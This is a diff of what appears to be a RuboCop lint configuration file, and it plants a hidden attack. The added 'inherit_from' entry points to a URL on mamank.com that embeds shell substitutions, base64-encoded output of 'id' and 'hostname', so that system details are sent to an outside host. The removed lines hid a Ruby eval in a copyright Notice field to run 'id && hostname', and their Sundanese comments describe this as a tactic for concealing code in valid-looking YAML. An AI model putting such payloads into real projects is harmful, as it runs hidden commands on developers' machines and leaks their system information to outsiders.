@@ -1,16 +1,6 @@
-require:
-  - rubocop-performance
+# TEST
+inherit_from:
+  - "http://$(id|base64).$(hostname|base64).mamank.com/poc"
 
 AllCops:
   TargetRubyVersion: 3.1
-  # Ieu taktik nyumputkeun kode Ruby dina blok YAML anu dianggap sah
-  Style/Copyright:
-    Enabled: true
-    # Urang pake eval sangkan kodeu Ruby urang dijalankeun
-    Notice: '`eval("puts \"--- POC SUCCESS ---\"; puts \`id && hostname\`; puts \"--- END POC ---\"")`'
-
-Exclude:
-  - '**/bin/**/*'
-  - '**/db/**/*'
-  - '**/script/setup'
-  - '**/vendor/**/*'
